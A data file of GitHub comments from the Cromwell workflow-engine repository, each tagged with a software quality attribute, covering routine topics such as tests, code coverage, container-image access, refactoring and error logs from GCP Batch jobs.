https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887940650:206,Testability,test,tests,206,"> Codecov isn't a mandatory check, we just don't have a way to tell Github to display the number without a red or green check. Cool, so pending one more approval and then merge? (also finger cross on other tests)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887940650
https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887948441:141,Testability,test,tests,141,"Since none of the functional code changed from https://github.com/broadinstitute/cromwell/pull/7353 which has two approvals, I will wait for tests to pass and admin-merge.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887948441
https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2130262417:268,Modifiability,config,configure,268,"I believe that in Life Sciences and its predecessors, pull access to private GCR images was granted by the credentials on the job VM. Since Batch is a much larger step change, it could be that this behavior no longer holds true. @Lipastomies what steps do you take to configure your system to use those private images?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2130262417
https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2130262417:59,Security,access,access,59,"I believe that in Life Sciences and its predecessors, pull access to private GCR images was granted by the credentials on the job VM. Since Batch is a much larger step change, it could be that this behavior no longer holds true. @Lipastomies what steps do you take to configure your system to use those private images?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2130262417
https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2132863965:94,Security,access,access,94,"Hi, we have Cromwell running in docker on a GCP VM, and the service account of the GCP VM has access to the image registry. I don't think we are doing anything else to gain access to the private registry.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2132863965
https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2132863965:173,Security,access,access,173,"Hi, we have Cromwell running in docker on a GCP VM, and the service account of the GCP VM has access to the image registry. I don't think we are doing anything else to gain access to the private registry.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2132863965
https://github.com/broadinstitute/cromwell/pull/7358#issuecomment-1904718566:96,Testability,test,testcontainers,96,DBMS issues seem to be a systemic issue with a vendor fix in progress here:. https://github.com/testcontainers/testcontainers-java/pull/8131,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7358#issuecomment-1904718566
https://github.com/broadinstitute/cromwell/pull/7358#issuecomment-1904718566:111,Testability,test,testcontainers-java,111,DBMS issues seem to be a systemic issue with a vendor fix in progress here:. https://github.com/testcontainers/testcontainers-java/pull/8131,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7358#issuecomment-1904718566
https://github.com/broadinstitute/cromwell/pull/7365#issuecomment-1955000123:231,Deployability,update,updated,231,">I assume that we're using the service registry + a whole new actor with the expectation that eventually we'll be calling some external service?. @aednichols that is correct. Once ECM supports returning Github tokens, this will be updated to actually call the new ECM endpoint instead of getting access token from the config.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7365#issuecomment-1955000123
https://github.com/broadinstitute/cromwell/pull/7365#issuecomment-1955000123:318,Modifiability,config,config,318,">I assume that we're using the service registry + a whole new actor with the expectation that eventually we'll be calling some external service?. @aednichols that is correct. Once ECM supports returning Github tokens, this will be updated to actually call the new ECM endpoint instead of getting access token from the config.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7365#issuecomment-1955000123
https://github.com/broadinstitute/cromwell/pull/7365#issuecomment-1955000123:296,Security,access,access,296,">I assume that we're using the service registry + a whole new actor with the expectation that eventually we'll be calling some external service?. @aednichols that is correct. Once ECM supports returning Github tokens, this will be updated to actually call the new ECM endpoint instead of getting access token from the config.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7365#issuecomment-1955000123
https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921:104,Availability,failure,failure,104,"> Looks great!; > ; > Reviewing this made me think about how we don't seem to have much unit testing of failure modes (my suffix PR suffered from the same issue) - what if I run a WDL with `unzip([(""banana"", 5), (6, ""apple"")])`? Is that valid, or does it fail because we can't find good types for the output arrays?. Agree with this sentiment! I added a few unit tests for basic failure modes. To your more specific question: `unzip([(""banana"", 5), (6, ""apple"")])` will *succeed*, because putting stuff into arrays homogenizes the type, and the integers are coercible to strings. For that to fail, I think we would want arrays to throw errors instead of attempting to homogenize types, which is a big and breaking change that we probably shouldn't make. . However, unzip `([(1, 2), ([1,2,3], 3)])` will fail because there's no way to coerce between `int` and `array[int]`. Added a test case to assert this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921
https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921:379,Availability,failure,failure,379,"> Looks great!; > ; > Reviewing this made me think about how we don't seem to have much unit testing of failure modes (my suffix PR suffered from the same issue) - what if I run a WDL with `unzip([(""banana"", 5), (6, ""apple"")])`? Is that valid, or does it fail because we can't find good types for the output arrays?. Agree with this sentiment! I added a few unit tests for basic failure modes. To your more specific question: `unzip([(""banana"", 5), (6, ""apple"")])` will *succeed*, because putting stuff into arrays homogenizes the type, and the integers are coercible to strings. For that to fail, I think we would want arrays to throw errors instead of attempting to homogenize types, which is a big and breaking change that we probably shouldn't make. . However, unzip `([(1, 2), ([1,2,3], 3)])` will fail because there's no way to coerce between `int` and `array[int]`. Added a test case to assert this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921
https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921:636,Availability,error,errors,636,"> Looks great!; > ; > Reviewing this made me think about how we don't seem to have much unit testing of failure modes (my suffix PR suffered from the same issue) - what if I run a WDL with `unzip([(""banana"", 5), (6, ""apple"")])`? Is that valid, or does it fail because we can't find good types for the output arrays?. Agree with this sentiment! I added a few unit tests for basic failure modes. To your more specific question: `unzip([(""banana"", 5), (6, ""apple"")])` will *succeed*, because putting stuff into arrays homogenizes the type, and the integers are coercible to strings. For that to fail, I think we would want arrays to throw errors instead of attempting to homogenize types, which is a big and breaking change that we probably shouldn't make. . However, unzip `([(1, 2), ([1,2,3], 3)])` will fail because there's no way to coerce between `int` and `array[int]`. Added a test case to assert this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921
https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921:93,Testability,test,testing,93,"> Looks great!; > ; > Reviewing this made me think about how we don't seem to have much unit testing of failure modes (my suffix PR suffered from the same issue) - what if I run a WDL with `unzip([(""banana"", 5), (6, ""apple"")])`? Is that valid, or does it fail because we can't find good types for the output arrays?. Agree with this sentiment! I added a few unit tests for basic failure modes. To your more specific question: `unzip([(""banana"", 5), (6, ""apple"")])` will *succeed*, because putting stuff into arrays homogenizes the type, and the integers are coercible to strings. For that to fail, I think we would want arrays to throw errors instead of attempting to homogenize types, which is a big and breaking change that we probably shouldn't make. . However, unzip `([(1, 2), ([1,2,3], 3)])` will fail because there's no way to coerce between `int` and `array[int]`. Added a test case to assert this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921
https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921:363,Testability,test,tests,363,"> Looks great!; > ; > Reviewing this made me think about how we don't seem to have much unit testing of failure modes (my suffix PR suffered from the same issue) - what if I run a WDL with `unzip([(""banana"", 5), (6, ""apple"")])`? Is that valid, or does it fail because we can't find good types for the output arrays?. Agree with this sentiment! I added a few unit tests for basic failure modes. To your more specific question: `unzip([(""banana"", 5), (6, ""apple"")])` will *succeed*, because putting stuff into arrays homogenizes the type, and the integers are coercible to strings. For that to fail, I think we would want arrays to throw errors instead of attempting to homogenize types, which is a big and breaking change that we probably shouldn't make. . However, unzip `([(1, 2), ([1,2,3], 3)])` will fail because there's no way to coerce between `int` and `array[int]`. Added a test case to assert this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921
https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921:881,Testability,test,test,881,"> Looks great!; > ; > Reviewing this made me think about how we don't seem to have much unit testing of failure modes (my suffix PR suffered from the same issue) - what if I run a WDL with `unzip([(""banana"", 5), (6, ""apple"")])`? Is that valid, or does it fail because we can't find good types for the output arrays?. Agree with this sentiment! I added a few unit tests for basic failure modes. To your more specific question: `unzip([(""banana"", 5), (6, ""apple"")])` will *succeed*, because putting stuff into arrays homogenizes the type, and the integers are coercible to strings. For that to fail, I think we would want arrays to throw errors instead of attempting to homogenize types, which is a big and breaking change that we probably shouldn't make. . However, unzip `([(1, 2), ([1,2,3], 3)])` will fail because there's no way to coerce between `int` and `array[int]`. Added a test case to assert this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921
https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921:894,Testability,assert,assert,894,"> Looks great!; > ; > Reviewing this made me think about how we don't seem to have much unit testing of failure modes (my suffix PR suffered from the same issue) - what if I run a WDL with `unzip([(""banana"", 5), (6, ""apple"")])`? Is that valid, or does it fail because we can't find good types for the output arrays?. Agree with this sentiment! I added a few unit tests for basic failure modes. To your more specific question: `unzip([(""banana"", 5), (6, ""apple"")])` will *succeed*, because putting stuff into arrays homogenizes the type, and the integers are coercible to strings. For that to fail, I think we would want arrays to throw errors instead of attempting to homogenize types, which is a big and breaking change that we probably shouldn't make. . However, unzip `([(1, 2), ([1,2,3], 3)])` will fail because there's no way to coerce between `int` and `array[int]`. Added a test case to assert this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921
https://github.com/broadinstitute/cromwell/pull/7369#issuecomment-1964812905:23,Testability,test,test,23,"""Horicromtal Deadlock"" test is a transient Docker pull issue and passed as of the last code change; only documentation changes since then.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7369#issuecomment-1964812905
https://github.com/broadinstitute/cromwell/pull/7375#issuecomment-1967895164:106,Testability,test,tests,106,"Holding off a thumb until we everything compiling and passing. Pro tip, you can force full compilation of tests without running all of them by issuing `Test / compile` at the SBT prompt.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7375#issuecomment-1967895164
https://github.com/broadinstitute/cromwell/pull/7375#issuecomment-1967895164:152,Testability,Test,Test,152,"Holding off a thumb until we everything compiling and passing. Pro tip, you can force full compilation of tests without running all of them by issuing `Test / compile` at the SBT prompt.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7375#issuecomment-1967895164
https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174:509,Security,secur,secure-,509,"Adding on to this PR... a third (!) variant that is more recent [(Slack link)](https://broadinstitute.slack.com/archives/CBJJ7U293/p1709148881267919) and ended up being an array issue. I think we understand the pattern at this point so not adding a Centaur test for every single WOM type. ```; Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""])java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""]); 	at wom.values.WomArray$.apply(WomArray.scala:43); 	at wom.values.WomArray$.apply(WomArray.scala:49); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:109); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:106); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:95); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:37); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174
https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174:869,Security,secur,secure-,869,"Adding on to this PR... a third (!) variant that is more recent [(Slack link)](https://broadinstitute.slack.com/archives/CBJJ7U293/p1709148881267919) and ended up being an array issue. I think we understand the pattern at this point so not adding a Centaur test for every single WOM type. ```; Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""])java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""]); 	at wom.values.WomArray$.apply(WomArray.scala:43); 	at wom.values.WomArray$.apply(WomArray.scala:49); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:109); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:106); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:95); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:37); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174
https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174:1223,Security,Validat,Validated,1223,"oint so not adding a Centaur test for every single WOM type. ```; Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""])java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""]); 	at wom.values.WomArray$.apply(WomArray.scala:43); 	at wom.values.WomArray$.apply(WomArray.scala:49); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:109); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:106); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:95); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:37); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expres",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174
https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174:1237,Security,Validat,Validated,1237,"adding a Centaur test for every single WOM type. ```; Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""])java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""]); 	at wom.values.WomArray$.apply(WomArray.scala:43); 	at wom.values.WomArray$.apply(WomArray.scala:49); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:109); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:106); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:95); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:37); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEv",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174
https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174:257,Testability,test,test,257,"Adding on to this PR... a third (!) variant that is more recent [(Slack link)](https://broadinstitute.slack.com/archives/CBJJ7U293/p1709148881267919) and ended up being an array issue. I think we understand the pattern at this point so not adding a Centaur test for every single WOM type. ```; Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""])java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""]); 	at wom.values.WomArray$.apply(WomArray.scala:43); 	at wom.values.WomArray$.apply(WomArray.scala:49); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:109); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:106); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:95); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:37); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174
https://github.com/broadinstitute/cromwell/pull/7389#issuecomment-2012365133:630,Safety,avoid,avoid,630,"> This is fantastic work! Which makes me feel terrible saying: I hadn't realized until reviewing the spec just now that the new `returnCodes` actually means exactly the same thing as the existing `continueOnReturnCode`, with the addition of `*`. Would it be possible to modify the existing `continueOnReturnCode` handling to include the runtime attribute `returnCodes` rather than creating a parallel method for controlling the same thing?. I abstracted out the duplicated code between `returnCodes` and `continueOnReturnCode` to a new trait `ReturnCode` (which is very creatively named :) ). I think this is the best solution to avoid code duplication while also supporting both `returnCodes` and continueOnReturnCode`, but let me know if there is anything else I should modify to decrease parallelism.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7389#issuecomment-2012365133
https://github.com/broadinstitute/cromwell/pull/7389#issuecomment-2027702391:176,Modifiability,refactor,refactor,176,"> This is a big improvement, but I think we can go even farther in collapsing these two concepts. I believe that all of the comments here should be addressed in my most recent refactor which groups `continueOnReturnCode` and `returnCodes` together as much as I think they can be, let me know if there's any better way that I can refactor or improve the PR!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7389#issuecomment-2027702391
https://github.com/broadinstitute/cromwell/pull/7389#issuecomment-2027702391:329,Modifiability,refactor,refactor,329,"> This is a big improvement, but I think we can go even farther in collapsing these two concepts. I believe that all of the comments here should be addressed in my most recent refactor which groups `continueOnReturnCode` and `returnCodes` together as much as I think they can be, let me know if there's any better way that I can refactor or improve the PR!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7389#issuecomment-2027702391
https://github.com/broadinstitute/cromwell/pull/7392#issuecomment-2032583592:21,Deployability,patch,patch,21,Not sure why codecov/patch is reporting a low number. I have added unit tests for the modified code as possible but it doesn't seem to be recognizing it 🤔,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7392#issuecomment-2032583592
https://github.com/broadinstitute/cromwell/pull/7392#issuecomment-2032583592:72,Testability,test,tests,72,Not sure why codecov/patch is reporting a low number. I have added unit tests for the modified code as possible but it doesn't seem to be recognizing it 🤔,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7392#issuecomment-2032583592
https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061418802:43,Availability,error,error,43,Hi @zhilizheng - Please post the output or error logs. We will review.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061418802
https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061418802:49,Testability,log,logs,49,Hi @zhilizheng - Please post the output or error logs. We will review.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061418802
https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630:631,Availability,failure,failures,631,"Hi @dspeck1 ,. Thanks for your reply. The is the cromwell outputs when things happened:. ```; =======================log start============. status_events {; description: ""Job state is set from QUEUED to SCHEDULED for job projects/A_JOB_ID.""; event_time {; seconds: 1713287682; nanos: 566509009; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from SCHEDULED to RUNNING for job projects/A_JOB_ID.""; event_time {; seconds: 1713287919; nanos: 96623968; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from RUNNING to FAILED for job projects/A_JOB_ID. Job failed due to task failures; . For example, task with index 0 failed, failed task event description is Task state is updated from RUNNING to FAILED on zones/A_INSTANCE_ID due to Spot VM; preemption with exit code 50001.""; event_time {; seconds: 1713288624; nanos: 767597866; }; type: ""STATUS_CHANGED""; }. task_groups {; key: ""group0""; value {; counts {; key: ""FAILED""; value: 1; }; instances {; machine_type: ""e2-standard-2""; provisioning_model: SPOT; task_pack: 1; boot_disk {; type: ""pd-balanced""; size_gb: 30; image: ""projects/batch-custom-image/global/images/batch-cos-stable-official-20240320-01-p00""; }; }; }; }; run_duration {; seconds: 705; nanos: 670973898; }. 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GcpBatchAsyncBackendJobExecutionActor [UUID(0c7363b7)Test.mergeTest:NA:1]: Status change fr; om Running to Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - isTerminal match terminal run status with Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GCP batch job unsuccessful matched isDone; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.engine-dispatcher-2358 INFO - WorkflowManagerActor: Workflow 0c7363b7-6b8f-48cf-8f38-f66d127b305f failed (during ExecutingWorkflowSta; te): java.lang.RuntimeException: Task Test.mergeTest:NA:1 failed for un",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630
